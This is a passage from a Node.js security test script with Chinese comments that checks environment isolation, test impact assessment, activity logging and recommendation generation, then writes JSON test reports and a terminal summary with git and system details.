        fs.unlinkSync(testFilePath);
      } else {
        // Windows跳过这个测试
        testManager.recordTestResult('文件权限检查', true, 'Windows平台跳过文件权限检查（适用）', 'medium');
      }
    } catch (error) {
      testManager.recordTestResult('文件权限检查', false, `错误: ${error.message}`, 'high');
      allTestsPassed = false;
    }
    
    return allTestsPassed;
  } catch (error) {
    testManager.recordTestResult('Test Monitor安全性', false, `错误: ${error.message}`, 'high');
    return false;
  }
}

/**
 * 环境隔离与影响评估安全性测试
 */
function testEnvironmentIsolationAndImpactAssessment() {
    console.log('\n🌍 测试环境隔离与影响评估安全性');
    
    let allTestsPassed = true;
    
    try {
      // 测试1: 环境隔离检测
      try {
        const isolation = checkEnvironmentIsolation();
        
        // 验证隔离检测结果包含必要字段
        const hasRequiredFields = isolation &&
                                typeof isolation.isIsolated === 'boolean' &&
                                isolation.type &&
                                typeof isolation.type === 'string';
        
        const test1Passed = testManager.recordTestResult('环境隔离检测', hasRequiredFields,
          hasRequiredFields ? '环境隔离检测正常（安全）' : '环境隔离检测异常（安全风险）', 'medium');
        allTestsPassed = allTestsPassed && test1Passed;
        
        // 记录隔离检测结果
        testManager.addSecurityRecommendation({
          type: 'environment',
          priority: 'medium',
          message: `当前环境隔离状态: ${isolation.isIsolated ? '已隔离' : '未隔离'} (${isolation.type})`,
          reason: '环境隔离检测提供了当前环境的隔离状态信息',
          source: {
            trigger: 'environment_isolation_check',
            context: isolation
          }
        });
      } catch (error) {
        testManager.recordTestResult('环境隔离检测', false, `错误: ${error.message}`, 'high');
        allTestsPassed = false;
      }
      
      // 测试2: 测试影响评估
      const testTypes = [
        { type: 'read-only', expectedLevel: 'low', expectedAreas: [] },
        { type: 'integration', expectedLevel: 'medium', expectedAreas: ['network', 'database'] },
        { type: 'system', expectedLevel: 'high', expectedAreas: ['filesystem', 'network', 'system'] }
      ];
      
      let impactAssessmentTestsPassed = 0;
      let failedImpactAssessments = [];
      
      for (const testType of testTypes) {
        try {
          const impact = assessTestImpact(testType);
          
          // 验证影响评估结果包含必要字段
          const hasRequiredFields = impact &&
                                 typeof impact.level === 'string' &&
                                 Array.isArray(impact.areas) &&
                                 typeof impact.description === 'string';
          
          // 验证影响级别
          const hasCorrectLevel = impact && impact.level === testType.expectedLevel;
          
          // 验证影响区域
          const hasCorrectAreas = impact &&
                                testType.expectedAreas.every(area => impact.areas.includes(area));
          
          if (hasRequiredFields && hasCorrectLevel && hasCorrectAreas) {
            impactAssessmentTestsPassed++;
          } else {
            failedImpactAssessments.push(`${testType.type} (字段: ${hasRequiredFields}, 级别: ${hasCorrectLevel}, 区域: ${hasCorrectAreas})`);
          }
        } catch (error) {
          failedImpactAssessments.push(`${testType.type} (${error.message})`);
        }
      }
      
      const test2Passed = testManager.recordTestResult('测试影响评估', impactAssessmentTestsPassed === testTypes.length,
        `影响评估测试: ${impactAssessmentTestsPassed}/${testTypes.length}`, 'medium');
      allTestsPassed = allTestsPassed && test2Passed;
      
      if (failedImpactAssessments.length > 0) {
        testManager.recordWarning('影响评估详情', `失败的评估: ${failedImpactAssessments.join(', ')}`);
      }
      
      // 测试3: 测试活动日志记录
      try {
        const testConfig = {
          type: 'integration',
          name: '日志记录测试',
          description: '测试测试活动日志记录'
        };
        
        const mockUser = {
          username: 'testuser',
          uid: 1000,
          gid: 1000,
          homedir: '/home/testuser',
          shell: '/bin/bash'
        };
        
        const impact = assessTestImpact(testConfig);
        const isolation = checkEnvironmentIsolation();
        
        const logPath = logTestActivity(mockUser, testConfig, impact, isolation);
        
        // 验证日志是否成功创建
        const logExists = logPath && fs.existsSync(logPath);
        
        // 验证日志内容
        let logContentValid = false;
        if (logExists) {
          try {
            const logContent = JSON.parse(fs.readFileSync(logPath, 'utf8'));
            const latestEntry = logContent[logContent.length - 1];
            
            logContentValid = latestEntry &&
                             latestEntry.user &&
                             latestEntry.test &&
                             latestEntry.impact &&
                             latestEntry.isolation &&
                             latestEntry.system;
          } catch (error) {
            // 日志解析失败
          }
        }
        
        const test3Passed = testManager.recordTestResult('测试活动日志记录', logExists && logContentValid,
          logExists && logContentValid ? '测试活动日志记录正常（安全）' : '测试活动日志记录异常（安全风险）', 'medium');
        allTestsPassed = allTestsPassed && test3Passed;
      } catch (error) {
        testManager.recordTestResult('测试活动日志记录', false, `错误: ${error.message}`, 'high');
        allTestsPassed = false;
      }
      
      // 测试4: 安全建议生成
      try {
        const testConfig = {
          type: 'system',
          name: '建议生成测试',
          description: '测试安全建议生成'
        };
        
        const mockUser = os.userInfo();
        const impact = assessTestImpact(testConfig);
        const isolation = checkEnvironmentIsolation();
        
        const recommendations = provideSecurityRecommendations(mockUser, testConfig, impact, isolation);
        
        // 验证建议是否生成
        const hasRecommendations = Array.isArray(recommendations) && recommendations.length > 0;
        
        // 验证建议格式
        let recommendationsValid = true;
        if (hasRecommendations) {
          for (const rec of recommendations) {
            if (!rec.type || !rec.priority || !rec.message) {
              recommendationsValid = false;
              break;
            }
          }
        }
        
        const test4Passed = testManager.recordTestResult('安全建议生成', hasRecommendations && recommendationsValid,
          hasRecommendations && recommendationsValid ? '安全建议生成正常（安全）' : '安全建议生成异常（安全风险）', 'medium');
        allTestsPassed = allTestsPassed && test4Passed;
        
        // 记录生成的建议
        if (hasRecommendations) {
          recommendations.forEach(rec => testManager.addSecurityRecommendation(rec));
        }
      } catch (error) {
        testManager.recordTestResult('安全建议生成', false, `错误: ${error.message}`, 'high');
        allTestsPassed = false;
      }
      
      return allTestsPassed;
    } catch (error) {
      testManager.recordTestResult('环境隔离与影响评估安全性', false, `错误: ${error.message}`, 'high');
      return false;
    }
  }
  
  // ==================== 报告生成 ====================
  
  /**
   * 生成安全测试报告
   */
  function generateSecurityReport(outDir, cliOptions) {
  const reportDir = outDir || path.join(__dirname, '..', '..', 'test-output');
  ensureDir(reportDir);
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const reportPath = path.join(reportDir, `security-test-report-${timestamp}.json`);
  
  const results = testManager.complete();
  const report = {
    metadata: {
      tool: 'security-test-suite',
      version: '2.0.0',
      timestamp: results.endTime,
      duration: results.duration
    },
    summary: {
      total: results.total,
      passed: results.passed,
      failed: results.failed,
      warnings: results.warnings,
      passRate: results.passRate,
      securityLevel: results.failed === 0 ? 'high' : results.failed <= 2 ? 'medium' : 'low'
    },
    environment: {
      env: buildEnvSnapshot(),
      context: buildContextSnapshot()
    },
    testDetails: results.details,
    securityRecommendations: testManager.securityRecommendations,
    cliOptions: cliOptions
  };
  
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  console.log(`\n📊 安全测试报告已生成: ${reportPath}`);
  
  return reportPath;
}

/**
 * 生成终端摘要
 */
function generateTerminalSummary(outDir, cliOptions, exitCode, durationMs) {
  if (!cliOptions.json) return null;
  
  const summary = {
    command: 'backend/scripts/security/security-test.cjs',
    exitCode,
    durationMs,
    verdict: exitCode === 0 ? 'PASS' : 'FAIL',
    expectedFailure: false,
    env: buildEnvSnapshot(),
    context: buildContextSnapshot(),
    timestamp: new Date().toISOString()
  };
  
  if (cliOptions.debug) {
    summary.schemaVersion = '2.0';
    summary.scriptVersion = 'security-test.cjs@2.0.0';
    
    try {
      const { execSync } = require('child_process');
      const branch = execSync('git rev-parse --abbrev-ref HEAD', { encoding: 'utf8' }).trim();
      const commit = execSync('git rev-parse --short HEAD', { encoding: 'utf8' }).trim();
      const status = execSync('git status --porcelain', { encoding: 'utf8' }).trim();
      summary.git = { branch, commit, dirty: status.length > 0 };
    } catch (_) {}
    
    try {
      const totalMemGB = Math.round(os.totalmem() / (1024 ** 3));
      summary.system = { 
        cpuModel: (os.cpus()[0] && os.cpus()[0].model) || 'unknown', 
        totalMemGB,
        platform: os.platform(),
        arch: os.arch()
      };
    } catch (_) {}
    
    try {
      const rssMB = Math.round(process.memoryUsage().rss / (1024 ** 2));
      summary.usage = { rssMB };
    } catch (_) {}
    
    summary.reason = exitCode === 0 ? 'success' : 'security_issues';
    summary.tags = ['security-test', 'integration', 'v2.0'];
    summary.thresholds = {
      idleTimeoutMs: process.env.IDLE_TIMEOUT_MS || null,
      cmdTimeoutMs: process.env.CMD_TIMEOUT_MS || null
    };
  }
  
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const jsonPath = path.join(outDir, `${ts}-terminal-summary.json`);
  fs.writeFileSync(jsonPath, JSON.stringify(summary, null, 2));
  
  return jsonPath;
}

// ==================== 主执行流程 ====================

/**
 * 主函数
 */
async function main() {
  console.log('🚀 安全功能测试开始 v2.0.0\n');
  
  const cli = parseArgs(process.argv);
  if (cli.help) {
    printHelp();
    return;
  }
  
  const outDir = cli.outDir || DEFAULT_OUT_DIR;
  ensureDir(outDir);
  const startHr = process.hrtime.bigint();
  
  // 设置测试环境
  const setupSuccess = setupTestEnvironment();
  if (!setupSuccess) {
    console.error('❌ 测试环境设置失败，退出测试');
    process.exit(1);
  }
  
  try {
    // 运行安全测试套件
    console.log('🧪 开始执行安全测试套件...\n');
    
    await testUserValidationSecurity();
    await testConfigEncryptionSecurity();
    await testSignatureVerificationSecurity();
    await testTestMonitorSecurity();
    await testEnvironmentIsolationAndImpactAssessment();
    
    // 生成报告
    const reportPath = generateSecurityReport(outDir, cli);
    const results = testManager.complete();
    const durationMs = Number((process.hrtime.bigint() - startHr) / 1000000n);
    
    // 输出测试结果摘要
    console.log('\n📈 安全测试结果摘要');
    console.log('='.repeat(50));
    console.log(`总测试数: ${results.total}`);
    console.log(`通过: ${results.passed} ✅`);
    console.log(`失败: ${results.failed} ❌`);
    console.log(`警告: ${results.warnings} ⚠️`);
    console.log(`通过率: ${results.passRate}`);
    console.log(`安全等级: ${results.failed === 0 ? '高 🔒' : results.failed <= 2 ? '中 🟡' : '低 🔴'}`);
    console.log(`耗时: ${durationMs}ms`);
    
    // 显示安全建议
    if (testManager.securityRecommendations.length > 0) {
      console.log('\n💡 安全建议');
      console.log('-'.repeat(30));
      
      const uniqueRecommendations = [];
      const seen = new Set();
      
      for (const rec of testManager.securityRecommendations) {
        const key = `${rec.type}-${rec.message}`;
        if (!seen.has(key)) {
          seen.add(key);
          uniqueRecommendations.push(rec);
        }
      }
      
      console.log(`总计 ${uniqueRecommendations.length} 条建议:`);
      
      // 按优先级排序显示
      const priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
      uniqueRecommendations.sort((a, b) => priorityOrder[a.priority] - priorityOrder[b.priority]);
      
      uniqueRecommendations.forEach((rec, index) => {
        const priorityIcon = rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : rec.priority === 'medium' ? '🟡' : '🟢';
        console.log(`\n${priorityIcon} ${index + 1}. ${rec.message}`);
        console.log(`   类型: ${rec.type}`);
        console.log(`   优先级: ${rec.priority}`);
        
        // 显示原因（归因）
        if (rec.reason) {
          console.log(`   原因: ${rec.reason}`);
        }
        
        // 显示来源信息（如果有）
        if (rec.source && rec.source.context) {
          console.log(`   触发条件: ${JSON.stringify(rec.source.context)}`);
        }
        
        if (rec.remediation && rec.remediation.length > 0) {
          console.log(`   整改方案:`);
          rec.remediation.forEach(step => console.log(`     - ${step}`));
        }
      });
    }
    
    // 生成终端摘要
    const summaryPath = generateTerminalSummary(outDir, cli, results.failed > 0 ? 1 : 0, durationMs);
    if (summaryPath) {
      console.log(`\n📄 终端摘要已生成: ${summaryPath}`);
    }
    
    // 根据测试结果决定退出码
    if (results.failed > 0) {
      console.log('\n🚨 存在安全风险，请检查安全测试报告获取详细信息');
      if (cli.strict) {
        process.exit(1);
      } else {
        console.log('ℹ️ 非严格模式，继续执行（退出码: 0）');
        process.exit(0);
      }
    } else {
      console.log('\n🎉 所有安全测试通过！系统安全防线稳固');
      process.exit(0);
    }
    
  } finally {
    // 清理测试环境
    cleanupTestEnvironment();
  }
}

// 如果直接运行此脚本，执行主函数
if (require.main === module) {
  main().catch(error => {
    console.error('❌ 安全测试执行出错:', error);
    process.exit(1);
  });
}

module.exports = {
  TestResultManager,
  setupTestEnvironment,
  cleanupTestEnvironment,
  testUserValidationSecurity,
  testConfigEncryptionSecurity,
  testSignatureVerificationSecurity,
  testTestMonitorSecurity,
  testEnvironmentIsolationAndImpactAssessment
};